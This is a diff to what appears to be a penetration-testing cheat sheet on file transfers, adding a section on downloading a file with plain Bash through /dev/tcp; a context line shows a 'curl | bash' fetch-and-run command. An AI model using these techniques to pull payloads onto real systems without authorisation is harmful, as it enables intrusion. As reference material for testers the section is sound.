@@ -341,6 +341,25 @@ curl <FILE URL> | bash
 ```
 
 </details>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
+<summary><h3>Download with Bash</h3></summary>
+
+**Connect to the Target Webserver**  
+```bash
+exec 3<>/dev/tcp/<IP>/<PORT>
+```
+
+**HTTP GET Request**  
+```bash
+echo -e "GET /<FILE> HTTP/1.1\n\n">&3
+```
+
+**Print the Response**  
+```bash
+cat <&3
+```
+
+</details>
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><h2>📥 Uploads</h2></summary>
